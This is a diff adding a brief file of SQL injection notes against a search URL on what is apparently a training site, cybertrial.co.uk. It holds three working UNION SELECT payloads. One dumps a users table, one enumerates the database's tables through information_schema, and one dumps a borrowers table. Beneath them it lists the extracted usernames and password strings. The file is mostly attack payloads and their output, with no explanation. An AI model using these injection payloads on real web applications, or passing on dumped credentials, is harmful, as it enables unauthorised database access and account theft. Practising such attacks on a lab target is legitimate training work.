@@ -1,0 +1,18 @@
+SQL Injection on url http://105.cybertrial.co.uk/search?genre=
+
+' UNION SELECT username,password,NULL,NULL,NULL FROM users--%20
+sally.jane		87fh3bjhass
+peter.hoffman		5hgdvse4jnu5
+
+
+' UNION SELECT table_schema,table_name,NULL,NULL,NULL FROM information_schema.tables--%20
+
+' UNION SELECT username,password,NULL,NULL,NULL FROM borrowers01--%20
+
+harry.smyth		43gferfd432
+jake.peters		dfg4442gdf2
+ruth.barnet		dfgd34t4fvfd
+jane.richards		434tdgfdfg3
+terry.edwards		dfgd323r4g
+richard.bakewell	23423gdfgd
+barry.blacksmith	dfgdfg4234
